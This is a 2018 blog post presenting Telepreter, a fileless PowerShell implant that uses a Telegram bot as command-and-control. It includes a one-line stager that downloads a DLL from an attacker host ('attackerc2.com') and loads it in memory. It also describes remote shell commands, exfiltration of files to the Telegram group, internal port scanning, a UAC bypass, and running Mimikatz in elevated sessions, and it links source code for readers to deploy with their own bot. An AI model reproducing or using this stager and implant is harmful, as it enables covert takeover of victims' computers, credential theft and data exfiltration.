---
layout: post
title:  "Pwning computers using Telegram bot API"
date:   2018-12-10 18:30:00 -0300
categories: tools
---

# Introduction

In this post I will share some experience I had while working on a project named Telepreter. Telepreter is a PowerShell Runspace that uses Telegram bot API as transport and communications and C# DLL reflection to stay in-memory. So you can control your shells with a Telegram group and a single bot.

Even further, I tried to add my favorite tools into it. So it has builtin AMSI and UAC bypasses from my earlier blog posts and some other excellent tools that I like very much like PowerView and PowerPreter.

Side-Note: This is just a PoC, and an idea that I wanted to make it happen. I do not intend to develop further into it.

# Building a Telegram Bot with PowerShell execution capabilities

So I decided to build a Telegram bot, capable of remote controlling a Windows computer. But more importantly that I wanted it fileless, so I chose using C# + PowerShell again, so we can operate in-memory and not rely at all with disk.


## Telegram API
I researched some libraries in C# that might suit my need, and found one that had all the functionalities that I wished for in this [repository](https://github.com/TelegramBots/Telegram.Bot);

After compiling the code, I had a Telegram.Bot.dll and NewtonSoft.dll which are dependencies.

## Initial problems

I had to work out with loading these DLL's in a manner that would not drop anything on disk. So I resorted to Reflection (again...).

Compressing and obfuscating all the DLL code into a base64 string constant value, I am able create a function that can load this assemblies in memory so we won't have any exception when Telegram API functions are invoked.

![Screenshot](/assets/telepreter_004.JPG)

## Crafting a small fileless Powershell stager payload

To start a new bot instance on our victim, all it needs to be executed is the following line in PowerShell:
```powershell
[Reflection.Assembly]::Load((iwr attackerc2.com/telepreter.dll).Content)/[Telepreter.Agent]::Load();[Telepreter.Agent]::new().Start()
```

Which in turn, I developed and integrated into the bot a function to create a stager payload.

![Screenshot](/assets/telepreter_006.JPG)

This way, an attacker can create .bat which could be used to infect more computers inside the network or spawning elevated bot instances (more on this later)

# Core functionalities 

## How to control the bot

To execute a command, simply type `/bot:BOT_ID /shell PowerShellCommandHere`
    
PS: Dont worry about output size. The bot will send 200 lines once a second, so every output is sent to you!

![Screenshot](/assets/telepreter_009.JPG)

## How to download files

To download a file, simply type `/bot:BOT_ID /download C:\windows\system32\license.rtf` and Bot will send this file in group using Telegram file upload API!

![Screenshot](/assets/telepreter_010.JPG)

## How to Port Scan with it!

It is also useful for Recon, too! There is a sightly modified version of Invoke-Portscan from Nishang pack. No need to do fancy pivoting tricks to scan the internal network!

![Screenshot](/assets/telepreter_011.JPG)


## How to bypass UAC with it!

Check how I bypassed UAC in a Lab computer that was infected with it!

![Screenshot](/assets/telepreter_007.JPG)

In the above picture, I created a .bat stager that resided in the user temporary folder. This tiny stager will fetch the DLL using the supplied URL and then use reflection to load all dependencies and start the main function of the bot.

![Screenshot](/assets/telepreter_008.JPG)

Looking the picture above, it is possible to observe that a new instance of a bot has started. And the `Administrator` flag is set to True, which means this is an elevated session and we can use post-exploitation tools like Invoke-Mimikatz or others that require elevated privileges to work. To avoid having problems with multiple instances, never stay with more than one active session.


# Conclusion and Code

This concludes the demonstration of this fun project I was working for a few days. Feel free to dig into it as much you want to. Probably a lot of people are going to say that it is crappy code... but it really is! I am no professional programmer.

It is just an demonstration of how something like that could work. Of course that there are a ton of better ways of doing it. So feel free to do it if you like!

To get access to the source-code: [Link](https://github.com/0x00-0x00/Telepreter)

## To start your own bot

Just replace the following values in the code:

![Screenshot](/assets/telepreter_012.JPG)


Have fun.

Best regards,

zc00l.